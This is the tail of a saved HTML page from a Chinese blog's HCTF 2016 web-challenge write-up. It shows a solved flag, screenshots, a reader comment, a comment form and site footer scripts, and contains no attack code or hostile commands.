+<p dir="ltr" style="line-height:1.38;margin-top:0pt;margin-bottom:0pt;"><span style='font-size: 14.6667px; vertical-align: baseline; white-space: pre-wrap; font-family: 微软雅黑, "Microsoft YaHei";'><img height="27" src="./HCTF2016WebWP – Wupco's Blog/35.png" style="border: none; transform: rotate(0.00rad); -webkit-transform: rotate(0.00rad);" title="35.png" width="602"/></span></p>
+<p dir="ltr" style="line-height:1.38;margin-top:0pt;margin-bottom:0pt;"><span style='font-size: 14.6667px; vertical-align: baseline; white-space: pre-wrap; font-family: 微软雅黑, "Microsoft YaHei";'><img alt="I$[ZD9YZUG6%]MMEZMYRT%Q.png" height="71" src="./HCTF2016WebWP – Wupco's Blog/36.png" style="border: none; transform: rotate(0.00rad); -webkit-transform: rotate(0.00rad);" title="36.png" width="602"/></span></p>
+<p><span style='font-size: 14.6667px; vertical-align: baseline; white-space: pre-wrap; font-family: 微软雅黑, "Microsoft YaHei";'>解完得flag   hctf{0pcAch3_fo0_cRack}</span></p>
+<p></p>
+<p></p>
+<h3 style="margin-top:19px;page-break-after:auto"></h3>
+<h3 style="margin-top: 19px; break-after: auto; text-align: left; text-indent: 2em;"><span style='font-family: 微软雅黑, "Microsoft YaHei"; font-size: 18px;'><strong><span style='font-family: 微软雅黑, "Microsoft YaHei"; line-height: 115%; color: windowtext;'></span></strong></span></h3>
+</article>
+<section class="ending">
+<ul class="sns">
+<li class="tencent"><a href="http://wpa.qq.com/msgrd?v=3&amp;uin=827977014&amp;site=qq&amp;menu=yes" target="_blank"><i class="iconfont"></i></a></li>
+<li class="zhihu"><a href="https://www.zhihu.com/people/wupco " target="_blank"><i class="iconfont"></i></a></li>
+</ul>
+<div class="reward">
+                打
+                <ul>
+<li><img src="./HCTF2016WebWP – Wupco's Blog/QQ图片20170222193616.png"/>用支付宝打我</li>
+<li><img src="./HCTF2016WebWP – Wupco's Blog/QQ图片20170222193616.png"/>用微信打我</li>
+</ul>
+</div>
+<div class="about">
+<img alt="" class="avatar avatar-80 photo" height="80" src="./HCTF2016WebWP – Wupco's Blog/cd0d984309c15bd1f668df0d0343eccds=80&amp;d=mm&amp;r=g" srcset="http://cn.gravatar.com/avatar/cd0d984309c15bd1f668df0d0343eccd?s=160&amp;d=mm&amp;r=g 2x" width="80"> <p></p>
+</img></div>
+</section>
+<!-- You can start editing here. -->
+<h3 id="comments">
+		一条回应：“HCTF2016|Web|WP”	</h3>
+<div class="navigation">
+<div class="alignleft"></div>
+<div class="alignright"></div>
+</div>
+<ol class="commentlist">
+<li class="comment even thread-even depth-1" id="comment-8">
+<div class="comment-body" id="div-comment-8">
+<div class="comment-author vcard">
+<img alt="" class="avatar avatar-32 photo" height="32" src="./HCTF2016WebWP – Wupco's Blog/6f206a377bc029dd01fb2d4425499794s=32&amp;d=mm&amp;r=g" srcset="http://cn.gravatar.com/avatar/6f206a377bc029dd01fb2d4425499794?s=64&amp;d=mm&amp;r=g 2x" width="32"> <cite class="fn"><a class="url" href="http://ruzusi.cn/blog" rel="external nofollow">Akumade</a></cite><span class="says">说道：</span> </img></div>
+<div class="comment-meta commentmetadata"><a href="http://www.wupco.cn/?p=106#comment-8">
+			2016年12月8日 上午8:17</a> </div>
+<p>苟利国家生死以</p>
+<div class="reply"><a aria-label="回复给Akumade" class="comment-reply-link" href="http://www.wupco.cn/?p=106&amp;replytocom=8#respond" onclick='return addComment.moveForm( "div-comment-8", "8", "respond", "106" )' rel="nofollow">回复</a></div>
+</div>
+</li><!-- #comment-## -->
+</ol>
+<div class="navigation">
+<div class="alignleft"></div>
+<div class="alignright"></div>
+</div>
+<div class="comment-respond" id="respond">
+<h3 class="comment-reply-title" id="reply-title">发表评论 <small><a href="/?p=106#respond" id="cancel-comment-reply-link" rel="nofollow" style="display:none;">取消回复</a></small></h3> <form action="http://www.wupco.cn/wp-comments-post.php" class="comment-form" id="commentform" method="post">
+<p class="comment-notes"><span id="email-notes">电子邮件地址不会被公开。</span> 必填项已用<span class="required">*</span>标注</p><p class="comment-form-comment"><label for="comment">评论</label> <textarea aria-required="true" cols="45" id="comment" maxlength="65525" name="w" required="required" rows="8"></textarea><textarea cols="100%" name="comment" rows="4" style="display:none"></textarea></p><p class="comment-form-author"><label for="author">姓名 <span class="required">*</span></label> <input aria-required="true" id="author" maxlength="245" name="author" required="required" size="30" type="text" value=""/></p>
+<p class="comment-form-email"><label for="email">电子邮件 <span class="required">*</span></label> <input aria-describedby="email-notes" aria-required="true" id="email" maxlength="100" name="email" required="required" size="30" type="text" value=""/></p>
+<p class="comment-form-url"><label for="url">站点</label> <input id="url" maxlength="200" name="url" size="30" type="text" value=""/></p>
+<p class="form-submit"><input class="submit" id="submit" name="submit" type="submit" value="发表评论"/> <input id="comment_post_ID" name="comment_post_ID" type="hidden" value="106"/>
+<input id="comment_parent" name="comment_parent" type="hidden" value="0"/>
+</p> </form>
+</div><!-- #respond -->
+</section>
+<div class="clearer"></div>
+<nav class="navigator">
+</nav>
+</div>
+</div>
+<div class="clearer"></div>
+<div class="search">
+<form action="http://www.wupco.cn" method="get">
+<input autocomplete="off" class="search_key" name="s" placeholder="Enter search keywords..." required="required" type="text" value=""/>
+<button alt="Search" type="submit">Search</button>
+</form>
+</div>
+<footer id="footer">
+<section class="links_adlink">
+<ul class="container">
+</ul>
+</section>
+友情链接:<a href="http://www.hazzel.cn">Hazzel师傅</a> <a href="http://www.yqxiaojunjie.com/">俊杰师傅</a> <a href="http://margular.github.io">sunshine</a> <a href="https://3wapp.github.io/">janes师傅</a><br/> <a href="http://www.au1ge.xyz/">au1ge</a><br/>
+© 2017 <a href="http://www.wupco.cn">Wupco's Blog</a>
+<a class="back2top"></a>
+</footer>
+<script type="text/javascript">SyntaxHighlighter.all();</script><script type="text/javascript">
+/* <![CDATA[ */
+var ajaxcomment = {"ajax_url":"http:\/\/www.wupco.cn\/wp-admin\/admin-ajax.php","order":"asc","formpostion":"top"};
+/* ]]> */
+</script>
+<script src="./HCTF2016WebWP – Wupco's Blog/app.jsver=20141010" type="text/javascript"></script>
+<script style="display:none">
+function index_overloaded(){
+
+}
+</script>
+<script src="./HCTF2016WebWP – Wupco's Blog/jquery.min.js"></script>
+<script src="./HCTF2016WebWP – Wupco's Blog/functions.js"></script>
+<script>
+</script>
+</body>
+</html>
